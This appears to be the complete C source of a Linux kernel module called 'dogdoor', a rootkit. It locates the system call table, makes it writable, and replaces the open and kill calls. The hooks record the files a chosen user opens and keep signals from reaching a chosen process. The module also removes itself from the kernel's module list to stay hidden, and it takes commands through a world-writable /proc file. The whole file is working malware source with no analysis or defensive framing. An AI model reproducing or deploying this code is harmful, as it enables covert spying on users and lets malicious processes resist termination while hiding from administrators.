#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");

void ** sctable;
bool hidden = false;

char fname_list[10][256];
char message[256];

kuid_t target_uid;
pid_t target_pid;

int userid = 1001;
int count = 0;
int target_id;
int fname_count = 0;
int prog_num = 0;

struct list_head this;
struct list_head *list_temp;
struct list_head *prev;
struct list_head *next;

asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode);
asmlinkage long (*orig_sys_kill)(pid_t pid, int sig);

asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode) {
	char fname[256];
	int i;

	copy_from_user(fname, filename, 256);

	if (prog_num == 1 && uid_eq(current->cred->uid, target_uid)) {
		if (fname_count < 10) {
			strcpy(fname_list[fname_count], fname);
			fname_count += 1;
		} else {
			for (i = 0; i < 9; i++) {
				strcpy(fname_list[i], fname_list[i+1]);
			}
			strcpy(fname_list[9], fname);
		}
	}

	return orig_sys_open(filename, flags, mode);
}

asmlinkage long dogdoor_sys_kill(pid_t pid, int sig){
	char block[256] = "block";
	char free[256] = "free";
	
	if (prog_num == 2 && target_pid == pid) {
		if (strcmp(message, block) == 0){
			printk("******************* KILLLLLLL *******************");
			return -1;
		} else if (strcmp(message, free) == 0) {
			printk("******************* FREEEEEEE *******************");
		}
	}

	return orig_sys_kill(pid, sig);
}

static int dogdoor_proc_open(struct inode *inode, struct file *file) {
	return 0;
}

static int dogdoor_proc_release(struct inode *inode, struct file *file) {
	return 0;
}

static ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) {
	char buf[256];
	ssize_t toread;

	sprintf(buf, "%d:%d\n", userid, count);

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset;

	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT;

	*offset = *offset + toread;

	return toread;
}

static ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) {
	char buf[256];
	
	if (*offset != 0 || size > 128)
		return -EFAULT;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT;
	
	target_uid.val = userid;
	sscanf(buf, "%d %s %d", &prog_num, message, &target_id);
	printk("%d, %s, %d", prog_num, message, target_id);
	
	if (prog_num == 1) {
		target_uid.val = target_id;
	}
	else if (prog_num == 2) {
		target_pid = target_id;
	}
	else if (prog_num == 3) {
		if (hidden) {
			next->prev = list_temp;
			prev->next = list_temp;
			printk("******* Not Hidden!! *******");
			hidden = false;
		} else {
			next->prev = prev;
			prev->next = next;
			printk("******* Hidden!!! ********");
			hidden = true;
		}
	}
	
	count = 0;
	*offset = strlen(buf);

	return *offset;
}

static const struct file_operations dogdoor_fops = {
	.owner = 	THIS_MODULE,
	.open =		dogdoor_proc_open,
	.read = 	dogdoor_proc_read,
	.write =	dogdoor_proc_write,
	.llseek =	seq_lseek,
	.release = 	dogdoor_proc_release,
};

static int __init dogdoor_init(void) {
	unsigned int level;
	pte_t * pte;

	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops);

	sctable = (void *) kallsyms_lookup_name("sys_call_table");

	orig_sys_open = sctable[__NR_open];
	orig_sys_kill = sctable[__NR_kill];
	pte = lookup_address((unsigned long) sctable, &level);
	if (pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	sctable[__NR_open] = dogdoor_sys_open;
	sctable[__NR_kill] = dogdoor_sys_kill;

	this = THIS_MODULE->list;
	next = (&this)->next;
	prev = (&this)->prev;
	list_temp = next->prev;

	return 0;
}

static void __exit dogdoor_exit(void) {
	unsigned int level;
	pte_t * pte;
	remove_proc_entry("dogdoor", NULL);

	sctable[__NR_open] = orig_sys_open;
	sctable[__NR_kill] = orig_sys_kill;
	pte = lookup_address((unsigned long) sctable, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
